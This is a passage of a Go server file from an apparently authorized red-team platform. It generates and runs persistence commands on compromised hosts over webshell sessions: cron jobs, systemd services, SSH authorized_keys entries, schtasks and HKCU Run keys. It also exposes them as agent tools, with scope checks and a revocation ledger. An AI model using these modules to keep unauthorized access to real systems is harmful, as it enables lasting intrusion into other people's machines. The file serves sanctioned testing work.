package server

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/Autumn-27/jingwei/db"
	actool "github.com/Autumn-27/norma/tool"
)

// ---------------------------------------------------------------------------
// 权限维持：可撤销落地物台账 + 标准维持模块。
//
// 标准模块（cron / systemd / ssh_key / schtasks / registry）由平台生成「部署 + 撤销 + 验证」三组命令，
// 部署成功后自动登记台账；上传的新文件也会自动登记。每条台账自带撤销命令，
// 撤离阶段（P4）按 id 逆序执行撤销并以验证命令确认痕迹消失。
// ---------------------------------------------------------------------------

const (
	intranetArtifactOK      = "JW_ARTIFACT_OK"
	intranetArtifactPresent = "JW_ARTIFACT_PRESENT"
	intranetArtifactGone    = "JW_ARTIFACT_GONE"
	intranetArtifactFailed  = "JW_ARTIFACT_REVOKE_FAILED"

	intranetPersistTimeout = 60 * time.Second
	intranetVerifyTimeout  = 30 * time.Second
)

type intranetPersistInput struct {
	SessionID   int64  `json:"session_id"`
	TaskID      int64  `json:"task_id"`
	Kind        string `json:"kind"`
	Name        string `json:"name"`
	Schedule    string `json:"schedule"`
	Command     string `json:"command"`
	PublicKey   string `json:"public_key"`
	User        string `json:"user"`
	Description string `json:"description"`
}

type intranetArtifactRegisterInput struct {
	SessionID     int64          `json:"session_id"`
	TaskID        int64          `json:"task_id"`
	Host          string         `json:"host"`
	Kind          string         `json:"kind"`
	Name          string         `json:"name"`
	Path          string         `json:"path"`
	Description   string         `json:"description"`
	RevokeCommand string         `json:"revoke_command"`
	VerifyCommand string         `json:"verify_command"`
	Metadata      map[string]any `json:"metadata"`
}

// intranetPersistPlan is one standard module rendered into target commands.
type intranetPersistPlan struct {
	Kind, Name, Path, Description string
	Deploy, Revoke, Verify        string
	Metadata                      map[string]any
}

func intranetArtifactToken() (string, error) {
	var b [4]byte
	if _, err := rand.Read(b[:]); err != nil {
		return "", err
	}
	return hex.EncodeToString(b[:]), nil
}

var reCronField = regexp.MustCompile(`^[0-9A-Za-z*/,.-]+$`)

func normalizeCronSchedule(raw string) (string, error) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return "", errors.New(`schedule 不能为空（例如 "*/10 * * * *" 或 @reboot）`)
	}
	if strings.HasPrefix(raw, "@") {
		switch raw {
		case "@reboot", "@hourly", "@daily", "@weekly", "@monthly", "@yearly", "@annually":
			return raw, nil
		}
		return "", errors.New("不支持的 schedule，仅支持 @reboot/@hourly/@daily/@weekly/@monthly/@yearly")
	}
	fields := strings.Fields(raw)
	if len(fields) != 5 {
		return "", errors.New("schedule 需要 5 段（分 时 日 月 周）")
	}
	for _, f := range fields {
		if !reCronField.MatchString(f) {
			return "", fmt.Errorf("schedule 字段无效: %s", f)
		}
	}
	return strings.Join(fields, " "), nil
}

func buildCronPersistPlan(in intranetPersistInput) (intranetPersistPlan, error) {
	schedule, err := normalizeCronSchedule(in.Schedule)
	if err != nil {
		return intranetPersistPlan{}, err
	}
	command := strings.TrimSpace(in.Command)
	if command == "" {
		return intranetPersistPlan{}, errors.New("command 不能为空")
	}
	if strings.ContainsAny(command, "\r\n\x00") {
		return intranetPersistPlan{}, errors.New("cron command 不能包含换行或 NUL")
	}
	token, err := intranetArtifactToken()
	if err != nil {
		return intranetPersistPlan{}, err
	}
	marker := "# jw:" + token
	// crontab treats % as a newline inside commands.
	line := schedule + " " + strings.ReplaceAll(command, "%", `\%`) + " " + marker
	name := strings.TrimSpace(in.Name)
	if name == "" {
		name = "cron-" + token
	}
	return intranetPersistPlan{
		Kind:        db.IntranetArtifactCron,
		Name:        name,
		Path:        "crontab:" + token,
		Description: displayOr(strings.TrimSpace(in.Description), "计划任务 "+schedule+"："+truncateText(command, 200)),
		Deploy: fmt.Sprintf("(crontab -l 2>/dev/null | grep -vF %s; printf '%%s\\n' %s) | crontab - && echo %s",
			shQuote(marker), shQuote(line), intranetArtifactOK),
		Revoke: fmt.Sprintf("(crontab -l 2>/dev/null | grep -vF %s) | crontab - && echo %s",
			shQuote(marker), intranetArtifactOK),
		Verify: fmt.Sprintf("crontab -l 2>/dev/null | grep -qF %s && echo %s || echo %s",
			shQuote(marker), intranetArtifactPresent, intranetArtifactGone),
		Metadata: map[string]any{"token": token, "schedule": schedule, "command": command},
	}, nil
}

func buildSystemdPersistPlan(in intranetPersistInput) (intranetPersistPlan, error) {
	command := strings.TrimSpace(in.Command)
	if command == "" {
		return intranetPersistPlan{}, errors.New("command 不能为空")
	}
	if strings.ContainsRune(command, 0) {
		return intranetPersistPlan{}, errors.New("command 不能包含 NUL")
	}
	token, err := intranetArtifactToken()
	if err != nil {
		return intranetPersistPlan{}, err
	}
	unit := "jingwei-" + token + ".service"
	unitPath := "/etc/systemd/system/" + unit
	scriptPath := "/etc/jingwei-" + token + ".sh"
	name := strings.TrimSpace(in.Name)
	if name == "" {
		name = "systemd-" + token
	}
	desc := strings.ReplaceAll(strings.TrimSpace(in.Description), "\n", " ")
	if desc == "" {
		desc = "systemd 服务 " + unit + "：" + truncateText(command, 200)
	}
	unitBody := "[Unit]\nDescription=jingwei " + strings.ReplaceAll(truncateText(name, 80), "%", "%%") + "\n\n" +
		"[Service]\nType=simple\nExecStart=/bin/sh " + scriptPath + "\nRestart=always\nRestartSec=30\n\n" +
		"[Install]\nWantedBy=multi-user.target\n"
	scriptBody := "#!/bin/sh\nexec /bin/sh -c " + shQuote(command) + "\n"
	unitB64 := shQuote(base64.StdEncoding.EncodeToString([]byte(unitBody)))
	scriptB64 := shQuote(base64.StdEncoding.EncodeToString([]byte(scriptBody)))
	return intranetPersistPlan{
		Kind:        db.IntranetArtifactSystemd,
		Name:        name,
		Path:        unitPath,
		Description: desc,
		Deploy: fmt.Sprintf("printf '%%s' %s | base64 -d > %s && printf '%%s' %s | base64 -d > %s && chmod 700 %s && systemctl daemon-reload && systemctl enable --now %s && echo %s",
			unitB64, shQuote(unitPath), scriptB64, shQuote(scriptPath), shQuote(scriptPath), shQuote(unit), intranetArtifactOK),
		Revoke: fmt.Sprintf("systemctl disable --now %s 2>/dev/null; rm -f %s %s; systemctl daemon-reload 2>/dev/null; echo %s",
			shQuote(unit), shQuote(unitPath), shQuote(scriptPath), intranetArtifactOK),
		Verify: fmt.Sprintf("test -f %s && echo %s || echo %s",
			shQuote(unitPath), intranetArtifactPresent, intranetArtifactGone),
		Metadata: map[string]any{
			"token": token, "unit": unit, "unit_path": unitPath, "script_path": scriptPath, "command": command,
		},
	}, nil
}

var reSSHUser = regexp.MustCompile(`^[A-Za-z0-9][A-Za-z0-9._-]*$`)

// normalizeSSHPublicKey keeps the type and key body only; the ledger adds its
// own unique comment so revocation can find exactly the line it wrote.
func normalizeSSHPublicKey(raw string) (string, error) {
	raw = strings.TrimSpace(raw)
	if strings.ContainsAny(raw, "\r\n\x00") {
		return "", errors.New("public_key 必须是单行")
	}
	fields := strings.Fields(raw)
	if len(fields) < 2 {
		return "", errors.New("public_key 格式无效（应为 ssh-ed25519 AAAA... 或类似形式）")
	}
	typ := fields[0]
	valid := strings.HasPrefix(typ, "ssh-") || strings.HasPrefix(typ, "ecdsa-sha2-") ||
		strings.HasPrefix(typ, "sk-ssh-") || strings.HasPrefix(typ, "sk-ecdsa-")
	if !valid {
		return "", errors.New("不支持的公钥类型: " + typ)
	}
	if _, err := base64.StdEncoding.DecodeString(fields[1]); err != nil {
		return "", errors.New("公钥 base64 无效")
	}
	return typ + " " + fields[1], nil
}

// intranetSSHHomeScript resolves the target home directory at run time, so the
// same commands work for the current user or a named account.
func intranetSSHHomeScript(user string) (string, error) {
	user = strings.TrimSpace(user)
	if user == "" {
		return `home="$HOME"`, nil
	}
	if !reSSHUser.MatchString(user) {
		return "", errors.New("user 格式无效")
	}
	return "home=$(getent passwd " + shQuote(user) + " 2>/dev/null | cut -d: -f6)\n" +
		`[ -n "$home" ] || { echo "JW_USER_NOT_FOUND" >&2; exit 1; }`, nil
}

func buildSSHKeyPersistPlan(in intranetPersistInput) (intranetPersistPlan, error) {
	key, err := normalizeSSHPublicKey(in.PublicKey)
	if err != nil {
		return intranetPersistPlan{}, err
	}
	home, err := intranetSSHHomeScript(in.User)
	if err != nil {
		return intranetPersistPlan{}, err
	}
	token, err := intranetArtifactToken()
	if err != nil {
		return intranetPersistPlan{}, err
	}
	marker := "jw:" + token
	keyLine := key + " " + marker
	user := strings.TrimSpace(in.User)
	name := strings.TrimSpace(in.Name)
	if name == "" {
		name = "ssh-key-" + token
	}
	desc := strings.TrimSpace(in.Description)
	if desc == "" {
		desc = "SSH 公钥（" + displayOr(user, "当前用户") + "）：" + truncateText(key, 120)
	}
	file := `f="$home/.ssh/authorized_keys"`
	deploy := "set -e\n" + home + "\n" + file + `
mkdir -p "$home/.ssh"
chmod 700 "$home/.ssh"
touch "$f"
grep -qF ` + shQuote(marker) + ` "$f" || printf '%s\n' ` + shQuote(keyLine) + ` >> "$f"
chmod 600 "$f"
grep -qF ` + shQuote(marker) + ` "$f"
echo ` + intranetArtifactOK
	revoke := home + "\n" + file + `
if [ -f "$f" ]; then
  grep -vF ` + shQuote(marker) + ` "$f" > "$f.jwtmp" || true
  mv "$f.jwtmp" "$f" || { echo ` + intranetArtifactFailed + ` >&2; exit 1; }
  chmod 600 "$f" 2>/dev/null || true
fi
echo ` + intranetArtifactOK
	verify := home + "\n" + file + `
grep -qF ` + shQuote(marker) + ` "$f" 2>/dev/null && echo ` + intranetArtifactPresent + ` || echo ` + intranetArtifactGone
	return intranetPersistPlan{
		Kind:        db.IntranetArtifactSSHKey,
		Name:        name,
		Path:        "authorized_keys:" + displayOr(user, "current") + ":" + token,
		Description: desc,
		Deploy:      deploy,
		Revoke:      revoke,
		Verify:      verify,
		Metadata: map[string]any{
			"token": token, "user": user, "public_key": key, "marker": marker,
		},
	}, nil
}

// ---------------------------------------------------------------------------
// Windows 模块：schtasks（计划任务）与 registry（HKCU Run 键）。
// cmd 一行执行，名称带随机 token 保证撤销只删除自己创建的对象；命令禁止
// 双引号、%、换行，避免创建时被 cmd 提前展开或破坏参数结构。
// ---------------------------------------------------------------------------

var reWinArtifactName = regexp.MustCompile(`^[A-Za-z0-9][A-Za-z0-9._-]{0,39}$`)

func normalizeWinArtifactName(raw, fallback string) (string, error) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return fallback, nil
	}
	if !reWinArtifactName.MatchString(raw) {
		return "", errors.New("name 仅支持字母或数字开头，可含字母数字._-，最长 40 字符")
	}
	return raw, nil
}

func validateWinPersistCommand(command string) (string, error) {
	command = strings.TrimSpace(command)
	if command == "" {
		return "", errors.New("command 不能为空")
	}
	if strings.ContainsAny(command, "\r\n\x00\"") {
		return "", errors.New("command 不能包含换行、NUL 或双引号")
	}
	if strings.Contains(command, "%") {
		return "", errors.New("command 不能包含 %（schtasks/reg 创建时会提前展开变量）")
	}
	return command, nil
}

// normalizeWinSchedule accepts onlogon / onstart / minute:N (1-1439).
func normalizeWinSchedule(raw string) (string, error) {
	raw = strings.ToLower(strings.TrimSpace(raw))
	switch {
	case raw == "", raw == "onlogon":
		return "onlogon", nil
	case raw == "onstart":
		return "onstart", nil
	case strings.HasPrefix(raw, "minute:"):
		n, err := strconv.Atoi(strings.TrimPrefix(raw, "minute:"))
		if err != nil || n < 1 || n > 1439 {
			return "", errors.New("minute 触发需为 minute:1 到 minute:1439，例如 minute:30")
		}
		return "minute:" + strconv.Itoa(n), nil
	}
	return "", errors.New("Windows schedule 仅支持 onlogon/onstart/minute:N")
}

func winQuote(s string) string { return `"` + s + `"` }

func buildSchtasksPersistPlan(in intranetPersistInput) (intranetPersistPlan, error) {
	command, err := validateWinPersistCommand(in.Command)
	if err != nil {
		return intranetPersistPlan{}, err
	}
	trigger, err := normalizeWinSchedule(in.Schedule)
	if err != nil {
		return intranetPersistPlan{}, err
	}
	token, err := intranetArtifactToken()
	if err != nil {
		return intranetPersistPlan{}, err
	}
	base, err := normalizeWinArtifactName(in.Name, "jingwei")
	if err != nil {
		return intranetPersistPlan{}, err
	}
	taskName := base + "-" + token
	name := strings.TrimSpace(in.Name)
	if name == "" {
		name = "schtasks-" + token
	}
	desc := strings.TrimSpace(in.Description)
	if desc == "" {
		desc = "计划任务 " + taskName + "（" + trigger + "）：" + truncateText(command, 200)
	}
	sc, mo := trigger, ""
	if strings.HasPrefix(trigger, "minute:") {
		sc, mo = "minute", strings.TrimPrefix(trigger, "minute:")
	}
	create := fmt.Sprintf("schtasks /create /f /tn %s /tr %s /sc %s",
		winQuote(taskName), winQuote("cmd.exe /c "+command), sc)
	if mo != "" {
		create += " /mo " + mo
	}
	return intranetPersistPlan{
		Kind:        db.IntranetArtifactSchtasks,
		Name:        name,
		Path:        "schtasks:" + taskName,
		Description: desc,
		Deploy:      create + " 2>&1 && echo " + intranetArtifactOK,
		// cmd 内建命令（echo）不会重置 ERRORLEVEL，末尾显式归零，
		// 否则“对象不存在”的正常分支会被当成命令失败。
		Revoke: fmt.Sprintf("schtasks /delete /f /tn %s >nul 2>&1 & echo %s & cmd /c exit 0",
			winQuote(taskName), intranetArtifactOK),
		Verify: fmt.Sprintf("schtasks /query /tn %s >nul 2>&1 && echo %s || echo %s & cmd /c exit 0",
			winQuote(taskName), intranetArtifactPresent, intranetArtifactGone),
		Metadata: map[string]any{"token": token, "task_name": taskName, "schedule": trigger, "command": command},
	}, nil
}

const intranetWindowsRunKey = `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`

func buildRegistryPersistPlan(in intranetPersistInput) (intranetPersistPlan, error) {
	command, err := validateWinPersistCommand(in.Command)
	if err != nil {
		return intranetPersistPlan{}, err
	}
	token, err := intranetArtifactToken()
	if err != nil {
		return intranetPersistPlan{}, err
	}
	base, err := normalizeWinArtifactName(in.Name, "jingwei")
	if err != nil {
		return intranetPersistPlan{}, err
	}
	valueName := base + "-" + token
	name := strings.TrimSpace(in.Name)
	if name == "" {
		name = "registry-" + token
	}
	desc := strings.TrimSpace(in.Description)
	if desc == "" {
		desc = "注册表 Run 启动项 " + valueName + "：" + truncateText(command, 200)
	}
	return intranetPersistPlan{
		Kind:        db.IntranetArtifactRegistry,
		Name:        name,
		Path:        intranetWindowsRunKey + `\` + valueName,
		Description: desc,
		Deploy: fmt.Sprintf("reg add %s /v %s /t REG_SZ /d %s /f 2>&1 && echo %s",
			winQuote(intranetWindowsRunKey), winQuote(valueName), winQuote("cmd.exe /c "+command), intranetArtifactOK),
		Revoke: fmt.Sprintf("reg delete %s /v %s /f >nul 2>&1 & echo %s & cmd /c exit 0",
			winQuote(intranetWindowsRunKey), winQuote(valueName), intranetArtifactOK),
		Verify: fmt.Sprintf("reg query %s /v %s >nul 2>&1 && echo %s || echo %s & cmd /c exit 0",
			winQuote(intranetWindowsRunKey), winQuote(valueName), intranetArtifactPresent, intranetArtifactGone),
		Metadata: map[string]any{"token": token, "key": intranetWindowsRunKey, "value": valueName, "command": command},
	}, nil
}

func buildIntranetPersistPlan(in intranetPersistInput) (intranetPersistPlan, error) {
	switch strings.ToLower(strings.TrimSpace(in.Kind)) {
	case db.IntranetArtifactCron:
		return buildCronPersistPlan(in)
	case db.IntranetArtifactSystemd:
		return buildSystemdPersistPlan(in)
	case db.IntranetArtifactSSHKey:
		return buildSSHKeyPersistPlan(in)
	case db.IntranetArtifactSchtasks:
		return buildSchtasksPersistPlan(in)
	case db.IntranetArtifactRegistry:
		return buildRegistryPersistPlan(in)
	}
	return intranetPersistPlan{}, errors.New("kind 必须是 cron/systemd/ssh_key（POSIX）或 schtasks/registry（Windows）")
}

// intranetPersistKindForOS rejects modules that cannot work on the target
// shell family; the caller only gets here after OS detection, so a POSIX
// fallback on a Windows host surfaces as a clear kind error.
func intranetPersistKindForOS(kind, osKind string) error {
	switch strings.ToLower(strings.TrimSpace(kind)) {
	case db.IntranetArtifactCron, db.IntranetArtifactSystemd, db.IntranetArtifactSSHKey:
		if osKind == intranetOSWindows {
			return errors.New("目标为 Windows，POSIX 模块不可用；可用 kind: schtasks/registry")
		}
	case db.IntranetArtifactSchtasks, db.IntranetArtifactRegistry:
		if osKind != intranetOSWindows {
			return errors.New("schtasks/registry 仅用于 Windows 会话（当前 OS 判定为 POSIX；若目标实为 Windows，请先执行一次命令或 recon 完成 OS 探测）")
		}
	default:
		return errors.New("kind 必须是 cron/systemd/ssh_key（POSIX）或 schtasks/registry（Windows）")
	}
	return nil
}

func intranetArtifactSessionHost(sess *db.IntranetSession) string {
	if sess == nil {
		return ""
	}
	if host := intranetHost(sess.Host); host != "" {
		return host
	}
	return intranetHost(sess.WebshellURL)
}

func intranetArtifactSessionTask(sess *db.IntranetSession, fallback int64) int64 {
	if sess != nil && sess.TaskID != nil && *sess.TaskID > 0 {
		return *sess.TaskID
	}
	return fallback
}

func intranetArtifactEvidence(action string, run, verify intranetExecOutcome) string {
	var b strings.Builder
	if strings.TrimSpace(run.Output) != "" {
		b.WriteString("【" + action + "】\n" + truncateIntranetOutput(strings.TrimSpace(run.Output), 2000))
	}
	if run.Note != "" {
		b.WriteString("\n【" + action + "说明】" + run.Note)
	}
	if strings.TrimSpace(verify.Output) != "" {
		b.WriteString("\n【验证】\n" + truncateIntranetOutput(strings.TrimSpace(verify.Output), 1000))
	}
	return truncateIntranetOutput(strings.TrimSpace(b.String()), 4000)
}

// intranetPersist deploys one standard persistence module through a session and
// always records the artifact (even a failed deploy can leave partial files).
func (s *Server) intranetPersist(ctx context.Context, pg *db.DB, in intranetPersistInput) (*db.IntranetArtifact, intranetExecOutcome, intranetExecOutcome, error) {
	deployOut := intranetExecOutcome{ExitCode: -1}
	verifyOut := intranetExecOutcome{ExitCode: -1}
	sess, err := s.intranetSession(pg, in.SessionID)
	if err != nil {
		return nil, deployOut, verifyOut, err
	}
	if err := intranetPersistKindForOS(in.Kind, s.intranetOS(ctx, pg, sess)); err != nil {
		return nil, deployOut, verifyOut, err
	}
	plan, err := buildIntranetPersistPlan(in)
	if err != nil {
		return nil, deployOut, verifyOut, err
	}
	taskID := intranetArtifactSessionTask(sess, in.TaskID)
	host := intranetArtifactSessionHost(sess)
	if reason, allowed := s.intranetTargetAllowed(pg, taskID, host); !allowed {
		return nil, deployOut, verifyOut, errors.New(reason)
	}

	deployOut = s.intranetExec(ctx, pg, sess, plan.Deploy, intranetPersistTimeout)
	deployed := !deployOut.IsError && strings.Contains(deployOut.Output, intranetArtifactOK)
	if deployed {
		verifyOut = s.intranetExec(ctx, pg, sess, plan.Verify, intranetVerifyTimeout)
		deployed = !verifyOut.IsError && strings.Contains(verifyOut.Output, intranetArtifactPresent)
	}
	artifact, aerr := pg.AddIntranetArtifact(db.IntranetArtifactInput{
		TaskID: taskID, SessionID: sess.ID, Host: host, Kind: plan.Kind, Name: plan.Name,
		Path: plan.Path, Description: plan.Description, DeployCommand: plan.Deploy,
		RevokeCommand: plan.Revoke, VerifyCommand: plan.Verify,
		Evidence: intranetArtifactEvidence("部署", deployOut, verifyOut), Metadata: plan.Metadata,
	})
	if aerr != nil {
		return nil, deployOut, verifyOut, errors.New("部署命令已执行，但登记落地物台账失败: " + aerr.Error())
	}
	if !deployed {
		return artifact, deployOut, verifyOut, errors.New("部署未通过验证，已登记台账（# " + strconv.FormatInt(artifact.ID, 10) + "），撤离时会尝试撤销")
	}
	return artifact, deployOut, verifyOut, nil
}

// intranetRegisterArtifact records an artifact the operator deployed outside the
// standard modules (e.g. a file fetched with intranet_exec).
func (s *Server) intranetRegisterArtifact(pg *db.DB, in intranetArtifactRegisterInput) (*db.IntranetArtifact, error) {
	if strings.TrimSpace(in.RevokeCommand) == "" {
		return nil, errors.New("revoke_command 不能为空：不能撤销的落地物不允许登记")
	}
	var sess *db.IntranetSession
	if in.SessionID > 0 {
		var err error
		sess, err = s.intranetSession(pg, in.SessionID)
		if err != nil {
			return nil, err
		}
	}
	host := intranetHost(in.Host)
	if host == "" {
		host = intranetArtifactSessionHost(sess)
	}
	taskID := intranetArtifactSessionTask(sess, in.TaskID)
	kind := strings.ToLower(strings.TrimSpace(in.Kind))
	if kind == "" {
		kind = db.IntranetArtifactOther
	}
	return pg.AddIntranetArtifact(db.IntranetArtifactInput{
		TaskID: taskID, SessionID: in.SessionID, Host: host, Kind: kind, Name: in.Name,
		Path: in.Path, Description: in.Description, RevokeCommand: in.RevokeCommand,
		VerifyCommand: in.VerifyCommand, Metadata: in.Metadata,
	})
}

func intranetArtifactRevokeFailed(art *db.IntranetArtifact, out, verify intranetExecOutcome) error {
	detail := strings.TrimSpace(out.Output)
	if detail == "" {
		detail = strings.TrimSpace(out.Note)
	}
	if v := strings.TrimSpace(verify.Output); v != "" {
		detail += "；验证: " + v
	}
	if detail == "" {
		detail = "撤销命令没有输出"
	}
	return fmt.Errorf("落地物 #%d 撤销未通过验证: %s", art.ID, truncateIntranetOutput(detail, 300))
}

// intranetRevokeArtifact runs the ledger's revoke command and verifies the
// artifact is gone. A closed session is still usable for cleanup: the webshell
// behind it may be alive and is often the only path to remove the artifact.
func (s *Server) intranetRevokeArtifact(ctx context.Context, pg *db.DB, id, sessionID int64) (*db.IntranetArtifact, intranetExecOutcome, intranetExecOutcome, bool, error) {
	empty := intranetExecOutcome{ExitCode: -1}
	art, err := pg.GetIntranetArtifact(id)
	if err != nil {
		return nil, empty, empty, false, errors.New("落地物不存在")
	}
	if art.Status == db.IntranetArtifactRevoked {
		return art, empty, empty, true, nil
	}
	sid := sessionID
	if sid <= 0 && art.SessionID != nil {
		sid = *art.SessionID
	}
	if sid <= 0 {
		return art, empty, empty, false, errors.New("落地物没有绑定会话，请提供 session_id 后重试")
	}
	sess, err := pg.GetIntranetSession(sid)
	if err != nil {
		return art, empty, empty, false, errors.New("撤销会话不存在（可能已被删除）")
	}
	revokeOut := s.intranetExec(ctx, pg, sess, art.RevokeCommand, intranetPersistTimeout)
	revokeFailed := strings.Contains(revokeOut.Output, intranetArtifactFailed)
	ok := !revokeOut.IsError && !revokeFailed
	verifyOut := intranetExecOutcome{ExitCode: -1}
	if verifyCmd := strings.TrimSpace(art.VerifyCommand); verifyCmd != "" {
		verifyOut = s.intranetExec(ctx, pg, sess, verifyCmd, intranetVerifyTimeout)
		// 验证命令是"痕迹已消失"的最终依据：撤销命令可能不幂等（对象已被
		// 外部删除时返回非零），不能因此把已清理的落地物判为撤销失败。
		ok = !revokeFailed && strings.Contains(verifyOut.Output, intranetArtifactGone)
	}
	evidence := intranetArtifactEvidence("撤销", revokeOut, verifyOut)
	if ok {
		updated, merr := pg.MarkIntranetArtifactRevoked(id, evidence)
		if merr != nil {
			return art, revokeOut, verifyOut, false, merr
		}
		return updated, revokeOut, verifyOut, true, nil
	}
	if _, uerr := pg.UpdateIntranetArtifactEvidence(id, evidence); uerr == nil {
		if fresh, gerr := pg.GetIntranetArtifact(id); gerr == nil {
			art = fresh
		}
	}
	return art, revokeOut, verifyOut, false, intranetArtifactRevokeFailed(art, revokeOut, verifyOut)
}

// ---------------------------------------------------------------------------
// HTTP API
// ---------------------------------------------------------------------------

func (s *Server) listIntranetArtifacts(w http.ResponseWriter, r *http.Request) {
	pg := s.pg(w)
	if pg == nil {
		return
	}
	q := r.URL.Query()
	taskID, _ := strconv.ParseInt(strings.TrimSpace(q.Get("task_id")), 10, 64)
	sessionID, _ := strconv.ParseInt(strings.TrimSpace(q.Get("session_id")), 10, 64)
	rows, total, err := pg.ListIntranetArtifacts(db.IntranetArtifactFilter{
		TaskID: taskID, SessionID: sessionID, Host: q.Get("host"), Kind: q.Get("kind"),
		Status: q.Get("status"), Limit: atoiDefault(q.Get("limit"), 100), Offset: atoiDefault(q.Get("offset"), 0),
	})
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"artifacts": rows, "total": total})
}

func (s *Server) registerIntranetArtifact(w http.ResponseWriter, r *http.Request) {
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req intranetArtifactRegisterInput
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求格式错误")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	art, err := s.intranetRegisterArtifact(pg, req)
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"artifact": art})
}

func (s *Server) revokeIntranetArtifact(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的落地物 ID")
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req struct {
		SessionID int64 `json:"session_id"`
	}
	_ = decode(r, &req)
	pg := s.pg(w)
	if pg == nil {
		return
	}
	art, out, verify, revoked, err := s.intranetRevokeArtifact(r.Context(), pg, id, req.SessionID)
	if err != nil && art == nil {
		writeErr(w, 404, err.Error())
		return
	}
	code := 200
	if !revoked {
		code = 400
	}
	body := map[string]any{
		"artifact": art, "result": out, "verify": verify, "revoked": revoked,
	}
	if err != nil {
		body["error"] = err.Error()
	}
	writeJSON(w, code, body)
}

func (s *Server) persistIntranetSession(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的会话 ID")
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req intranetPersistInput
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求格式错误")
		return
	}
	req.SessionID = id
	pg := s.pg(w)
	if pg == nil {
		return
	}
	art, out, verify, err := s.intranetPersist(r.Context(), pg, req)
	if art == nil && err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	code := 200
	body := map[string]any{
		"artifact": art, "result": out, "verify": verify, "deployed": err == nil,
	}
	if err != nil {
		code = 400
		body["error"] = err.Error()
	}
	writeJSON(w, code, body)
}

// ---------------------------------------------------------------------------
// LLM 工具
// ---------------------------------------------------------------------------

func (s *Server) toolIntranetPersist() actool.CoreTool {
	return wrTool("intranet_persist",
		"部署标准权限维持模块并自动登记可撤销落地物：POSIX 会话用 kind=cron（schedule + command，写入带唯一标记的计划任务）、systemd（command，写 unit+启动脚本并 enable --now）、ssh_key（public_key，追加带唯一标记的 authorized_keys 行）；Windows 会话用 kind=schtasks（schedule + command，创建计划任务）、registry（command，写 HKCU Run 启动项）。部署前会做任务范围检查；部署后立即用验证命令确认，失败也会登记台账供撤离时清理。不要用它执行一次性命令；每个模块都会留下可审计的撤销命令。",
		objSchema(map[string]any{
			"session_id":  intranetIntParam("会话 ID（必填）"),
			"kind":        strParam("cron / systemd / ssh_key / schtasks / registry（必填，需与目标 OS 匹配）"),
			"name":        strParam("模块名称（可选，用于展示；Windows 任务/键名会自动追加随机后缀）"),
			"schedule":    strParam("触发方式：cron 用 5 段表达式或 @reboot；schtasks 用 onlogon/onstart/minute:N（可选，默认 onlogon）"),
			"command":     strParam("要维持执行的命令（cron/systemd/schtasks/registry 必填）"),
			"public_key":  strParam("SSH 公钥内容（kind=ssh_key 必填，如 ssh-ed25519 AAAA...）"),
			"user":        strParam("SSH 目标账号（可选，默认当前用户）"),
			"description": strParam("落地物说明（可选）"),
			"task_id":     intranetIntParam("归属任务 ID（可选，默认会话归属/当前任务）"),
		}, "session_id", "kind"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			var a intranetPersistInput
			if err := json.Unmarshal(in, &a); err != nil {
				return actool.Errorf("参数格式错误"), nil
			}
			if a.SessionID <= 0 {
				return actool.Errorf("session_id 必填"), nil
			}
			if a.TaskID <= 0 {
				a.TaskID = intranetCtxTaskID(ctx)
			}
			pg, err := s.intranetToolPG()
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			art, out, verify, perr := s.intranetPersist(ctx, pg, a)
			res := map[string]any{"artifact": art, "result": out, "verify": verify, "deployed": perr == nil}
			if perr != nil {
				res["error"] = perr.Error()
			}
			return jsonResult(res)
		})
}

func (s *Server) toolIntranetArtifacts() actool.CoreTool {
	return roTool("intranet_artifacts",
		"查询内网落地物台账（目标侧文件/计划任务/systemd 服务/SSH 公钥）。返回 kind/path/status/revoke_command/verify_command 等；status=active 表示尚未撤销。它是撤离清理的依据：不要删除已被撤销的记录，也不要遗漏 active 记录。",
		objSchema(map[string]any{
			"task_id":    intranetIntParam("按归属任务过滤（可选）"),
			"session_id": intranetIntParam("按会话过滤（可选）"),
			"host":       strParam("按目标主机过滤（可选）"),
			"kind":       strParam("file/cron/systemd/ssh_key/schtasks/registry/other（可选）"),
			"status":     strParam("active / revoked（可选）"),
			"limit":      intranetIntParam("最多返回条数，默认 100，最大 500"),
			"offset":     intranetIntParam("偏移（可选）"),
		}),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			var a struct {
				TaskID    int64  `json:"task_id"`
				SessionID int64  `json:"session_id"`
				Host      string `json:"host"`
				Kind      string `json:"kind"`
				Status    string `json:"status"`
				Limit     int    `json:"limit"`
				Offset    int    `json:"offset"`
			}
			if err := json.Unmarshal(in, &a); err != nil {
				return actool.Errorf("参数格式错误"), nil
			}
			pg, err := s.intranetToolPG()
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			rows, total, err := pg.ListIntranetArtifacts(db.IntranetArtifactFilter{
				TaskID: a.TaskID, SessionID: a.SessionID, Host: a.Host, Kind: a.Kind,
				Status: a.Status, Limit: a.Limit, Offset: a.Offset,
			})
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			return jsonResult(map[string]any{"artifacts": rows, "total": total})
		})
}

func (s *Server) toolIntranetArtifactRegister() actool.CoreTool {
	return wrTool("intranet_artifact_register",
